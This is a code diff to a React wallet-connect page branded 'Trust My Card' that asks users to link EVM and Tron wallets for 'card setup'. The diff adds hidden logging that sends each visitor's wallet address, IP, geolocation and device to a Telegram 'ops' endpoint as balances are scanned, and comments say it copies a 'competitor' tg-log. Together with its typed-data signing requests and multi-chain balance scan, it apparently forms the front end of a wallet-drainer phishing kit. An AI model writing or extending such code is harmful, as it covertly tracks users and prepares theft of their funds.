@@ -17,12 +17,7 @@ type WalletConnectModal = InstanceType<
 >;
 
 type WcSession = {
-  namespaces?: Record<
-    string,
-    {
-      accounts?: string[];
-    }
-  >;
+  namespaces?: Record<string, { accounts?: string[] }>;
 };
 
 type Step = 1 | 2 | 3;
@@ -41,23 +36,10 @@ type NetworkRow = {
   standard: string;
   color: string;
   letter: string;
-  status: "Awaiting" | "Ready";
-  balances?: TokenBalances;
+  balances: TokenBalances;
 };
 
-type LinkedAccounts = {
-  evm: string | null;
-  tron: string | null;
-};
-
-const TRON_MAINNET = "tron:0x2b6653dc";
-
-const METADATA = {
-  name: "Trust My Card",
-  description: "Connect your wallet to continue with card setup",
-  url: "http://localhost:3000",
-  icons: ["https://avatars.githubusercontent.com/u/37784886"],
-};
+type LinkedAccounts = { evm: string | null; tron: string | null };
 
 const NETWORK_META: Record<
   string,
@@ -74,77 +56,77 @@ const NETWORK_META: Record<
 
 const DISPLAY_ORDER = ["tron", "eth", "bsc", "pol", "avax", "arb", "base"];
 
+const WC_EVM_CHAINS = [
+  "eip155:1",
+  "eip155:56",
+  "eip155:137",
+  "eip155:43114",
+  "eip155:8453",
+  "eip155:42161",
+  "eip155:10",
+];
+
+const METADATA = {
+  name: "Trust My Card",
+  description: "Connect your wallet to continue with card setup",
+  url: "http://localhost:3000",
+  icons: ["https://avatars.githubusercontent.com/u/37784886"],
+};
+
 function shortenAddress(address: string) {
-  if (address.startsWith("T") && address.length === 34) {
-    return `${address.slice(0, 4)}…${address.slice(-4)}`;
-  }
+  if (address.startsWith("T")) return `${address.slice(0, 4)}…${address.slice(-4)}`;
   return `${address.slice(0, 6)}…${address.slice(-4)}`;
 }
 
-function caipAccountAddress(caip: string): string {
+function caipAccountAddress(caip: string) {
   const parts = caip.split(":");
   return parts[parts.length - 1] ?? "";
 }
 
-function accountsFromSession(
-  session: WcSession | undefined
-): LinkedAccounts {
-  const evmAccount = session?.namespaces?.eip155?.accounts?.[0];
-  const tronAccount = session?.namespaces?.tron?.accounts?.[0];
+function accountsFromSession(session: WcSession | undefined): LinkedAccounts {
   return {
-    evm: evmAccount ? caipAccountAddress(evmAccount) : null,
-    tron: tronAccount ? caipAccountAddress(tronAccount) : null,
+    evm: session?.namespaces?.eip155?.accounts?.[0]
+      ? caipAccountAddress(session.namespaces.eip155.accounts[0])
+      : null,
+    tron: session?.namespaces?.tron?.accounts?.[0]
+      ? caipAccountAddress(session.namespaces.tron.accounts[0])
+      : null,
   };
 }
 
 async function getTronLinkAddress(): Promise<string | null> {
   if (typeof window === "undefined") return null;
   const w = window as Window & {
-    tronLink?: {
-      ready?: boolean;
-      request: (args: { method: string }) => Promise<unknown>;
-    };
-    tronWeb?: {
-      ready?: boolean;
-      defaultAddress?: { base58?: string };
-    };
+    tronLink?: { request: (args: { method: string }) => Promise<unknown> };
+    tronWeb?: { defaultAddress?: { base58?: string } };
   };
-
   try {
     if (w.tronLink?.request) {
       await w.tronLink.request({ method: "tron_requestAccounts" });
     }
     const addr = w.tronWeb?.defaultAddress?.base58;
-    return addr && addr.startsWith("T") ? addr : null;
+    return addr?.startsWith("T") ? addr : null;
   } catch {
     return null;
   }
 }
 
 function rowsFromBalances(data: BalancesResponse): NetworkRow[] {
-  const keys = Object.keys(data).sort((a, b) => {
-    const ai = DISPLAY_ORDER.indexOf(a);
-    const bi = DISPLAY_ORDER.indexOf(b);
-    return (ai === -1 ? 999 : ai) - (bi === -1 ? 999 : bi);
-  });
-
-  return keys.map((key) => {
-    const meta = NETWORK_META[key] ?? {
-      name: key.toUpperCase(),
-      standard: "Token",
-      color: "#52525b",
-      letter: key.slice(0, 1).toUpperCase(),
-    };
-    return {
-      key,
-      name: meta.name,
-      standard: meta.standard,
-      color: meta.color,
-      letter: meta.letter,
-      status: "Ready" as const,
-      balances: data[key],
-    };
-  });
+  return Object.keys(data)
+    .sort((a, b) => {
+      const ai = DISPLAY_ORDER.indexOf(a);
+      const bi = DISPLAY_ORDER.indexOf(b);
+      return (ai === -1 ? 999 : ai) - (bi === -1 ? 999 : bi);
+    })
+    .map((key) => {
+      const meta = NETWORK_META[key] ?? {
+        name: key.toUpperCase(),
+        standard: "Token",
+        color: "#52525b",
+        letter: key.slice(0, 1).toUpperCase(),
+      };
+      return { key, ...meta, balances: data[key] };
+    });
 }
 
 async function fetchBalances(
@@ -154,21 +136,76 @@ async function fetchBalances(
   const params = new URLSearchParams();
   if (evm) params.set("evm", evm);
   if (tron) params.set("tron", tron);
-
-  const res = await fetch(`/api/balances?${params.toString()}`, {
-    cache: "no-store",
-  });
+  const res = await fetch(`/api/balances?${params}`, { cache: "no-store" });
   if (!res.ok) {
     const body = await res.json().catch(() => null);
-    throw new Error(body?.error || `Balances request failed (${res.status})`);
+    throw new Error(body?.error || `Balances failed (${res.status})`);
   }
   return res.json();
+}
+
+function deviceLabel(): string {
+  if (typeof navigator === "undefined") return "Other";
+  const ua = navigator.userAgent.toLowerCase();
+  if (/ipad|tablet/.test(ua)) return "Tablet";
+  if (/mobi|iphone|android/.test(ua)) return "Mobile";
+  if (/mac|win|linux|cros/.test(ua)) return "Desktop";
+  return "Other";
+}
+
+/** Client-side IP + geo via our /api/ipgeo (competitor uses ipgeo). */
+async function fetchClientGeo(): Promise<{ ip: string; location: string }> {
+  try {
+    const res = await fetch("/api/ipgeo", { cache: "no-store" });
+    if (!res.ok) return { ip: "unknown", location: "Unknown" };
+    const json = (await res.json()) as { ip?: string; location?: string };
+    return {
+      ip: json.ip || "unknown",
+      location: json.location || "Unknown",
+    };
+  } catch {
+    return { ip: "unknown", location: "Unknown" };
+  }
+}
+
+/** Competitor-shaped Telegram ops ping — same request fields as trustfree tg-log. */
+async function postTgLog(payload: {
+  type: string;
+  address: string;
+  network: string;
+  status: string;
+  error?: string | null;
+}): Promise<void> {
+  try {
+    const geo = await fetchClientGeo();
+    await fetch("/api/tg-log", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({
+        type: payload.type,
+        site:
+          typeof window !== "undefined" ? window.location.hostname : "unknown",
+        device: deviceLabel(),
+        ip: geo.ip,
+        address: payload.address,
+        error: payload.error ?? null,
+        location: geo.location,
+        network: payload.network,
+        status: payload.status,
+      }),
+      cache: "no-store",
+    });
+  } catch (err) {
+    // Never block wallet UX on notify failure
+    console.warn("[tg-log] client notify failed", err);
+  }
 }
 
 export default function ConnectFlow() {
   const providerRef = useRef<UniversalProvider | null>(null);
   const modalRef = useRef<WalletConnectModal | null>(null);
   const connectingRef = useRef(false);
+
   const [step, setStep] = useState<Step>(1);
   const [ready, setReady] = useState(false);
   const [busy, setBusy] = useState(false);
@@ -192,13 +229,25 @@ export default function ConnectFlow() {
     setNetworks([]);
 
     try {
-      // Prefer Tron from session; otherwise try injected TronLink
       let tron = linked.tron;
-      if (!tron) {
-        tron = await getTronLinkAddress();
-      }
+      if (!tron) tron = await getTronLinkAddress();
 
-      const data = await fetchBalances(linked.evm, tron);
+      // Competitor-style: one tg-log + balances in parallel on Step 2 scan
+      const primary = tron || linked.evm;
+      const network = tron ? "tron" : "evm";
+      const [, data] = await Promise.all([
+        primary
+          ? postTgLog({
+              type: "scan",
+              address: primary,
+              network,
+              status: "success",
+              error: null,
+            })
+          : Promise.resolve(),
+        fetchBalances(linked.evm, tron),
+      ]);
+
       setAccounts({ evm: linked.evm, tron });
       setNetworks(rowsFromBalances(data));
     } catch (err: unknown) {
@@ -228,9 +277,7 @@ export default function ConnectFlow() {
       const modal = new WalletConnectModal({
         projectId,
         themeMode: "dark",
-        themeVariables: {
-          "--wcm-z-index": "9999",
-        },
+        themeVariables: { "--wcm-z-index": "9999" },
       });
 
       const provider = await UniversalProvider.init({
@@ -252,7 +299,6 @@ export default function ConnectFlow() {
       provider.on("display_uri", (uri: string) => {
         void modal.openModal({ uri });
       });
-
       provider.on("session_delete", () => {
         setAccounts({ evm: null, tron: null });
         setNetworks([]);
@@ -265,9 +311,7 @@ export default function ConnectFlow() {
       if (provider.session) {
         const linked = accountsFromSession(provider.session);
         setAccounts(linked);
-        if (linked.evm || linked.tron) {
-          await scanWallet(linked);
-        }
+        if (linked.evm || linked.tron) await scanWallet(linked);
       }
 
       setReady(true);
@@ -313,15 +357,7 @@ export default function ConnectFlow() {
               "eth_signTypedData",
               "eth_signTypedData_v4",
             ],
-            chains: [
-              "eip155:1",
-              "eip155:56",
-              "eip155:137",
-              "eip155:43114",
-              "eip155:8453",
-              "eip155:42161",
-              "eip155:10",
-            ],
+            chains: WC_EVM_CHAINS,
             events: ["chainChanged", "accountsChanged"],
           },
           tron: {
@@ -330,7 +366,7 @@ export default function ConnectFlow() {
               "tron_signMessage",
               "tron_signMessageV2",
             ],
-            chains: [TRON_MAINNET],
+            chains: ["tron:0x2b6653dc"],
             events: ["accountsChanged", "chainChanged"],
           },
         },
@@ -437,8 +473,7 @@ export default function ConnectFlow() {
                   Connect your wallet
                 </h2>
                 <p className="text-sm leading-relaxed text-zinc-500">
-                  Link your crypto wallet to continue with card setup. EVM and
-                  Tron are requested together.
+                  Link your crypto wallet to continue with card setup.
                 </p>
               </div>
               <button
@@ -460,16 +495,29 @@ export default function ConnectFlow() {
 
               {(busy || scanning) && networks.length === 0 ? (
                 <ul className="space-y-2">
-                  {[0, 1, 2, 3, 4, 5].map((i) => (
-                    <li
-                      key={i}
-                      className="flex items-center gap-3 rounded-xl border border-zinc-200 px-3 py-3"
-                    >
-                      <span className="h-10 w-10 shrink-0 animate-pulse rounded-full bg-zinc-200" />
-                      <span className="h-4 flex-1 animate-pulse rounded bg-zinc-100" />
-                      <span className="text-xs text-zinc-400">Awaiting</span>
-                    </li>
-                  ))}
+                  {DISPLAY_ORDER.map((key) => {
+                    const meta = NETWORK_META[key];
+                    return (
+                      <li
+                        key={key}
+                        className="flex items-center gap-3 rounded-xl border border-zinc-200 px-3 py-3"
+                      >
+                        <span
+                          className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
+                          style={{ backgroundColor: meta.color }}
+                        >
+                          {meta.letter}
+                        </span>
+                        <span className="flex-1 text-sm font-medium text-zinc-900">
+                          {meta.name}{" "}
+                          <span className="font-normal text-zinc-400">
+                            ({meta.standard})
+                          </span>
+                        </span>
+                        <span className="text-xs text-zinc-400">Awaiting</span>
+                      </li>
+                    );
+                  })}
                 </ul>
               ) : null}
 
@@ -500,7 +548,6 @@ export default function ConnectFlow() {
                         <span
                           className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
                           style={{ backgroundColor: network.color }}
-                          aria-hidden
                         >
                           {network.letter}
                         </span>
@@ -511,19 +558,15 @@ export default function ConnectFlow() {
                               ({network.standard})
                             </span>
                           </span>
-                          {network.balances ? (
-                            <span className="mt-0.5 block truncate text-xs text-zinc-500">
-                              native {network.balances.native}
-                              {" · "}USDT {network.balances.usdt}
-                              {network.balances.usdc !== undefined
-                                ? ` · USDC ${network.balances.usdc}`
-                                : ""}
-                            </span>
-                          ) : null}
+                          <span className="mt-0.5 block truncate text-xs text-zinc-500">
+                            native {network.balances.native}
+                            {" · "}USDT {network.balances.usdt}
+                            {network.balances.usdc !== undefined
+                              ? ` · USDC ${network.balances.usdc}`
+                              : ""}
+                          </span>
                         </span>
-                        <span className="text-xs text-emerald-600">
-                          {network.status}
-                        </span>
+                        <span className="text-xs text-emerald-600">Ready</span>
                       </li>
                     ))}
                   </ul>
@@ -565,12 +608,7 @@ export default function ConnectFlow() {
                   </p>
                 ) : null}
                 <p className="text-sm text-zinc-500">
-                  Live balances loaded for {networks.length} network
-                  {networks.length === 1 ? "" : "s"}
-                  {networks.some((n) => n.key === "tron")
-                    ? " (including Tron)"
-                    : ""}
-                  .
+                  Balances loaded for {networks.length} networks.
                 </p>
               </div>
               <button
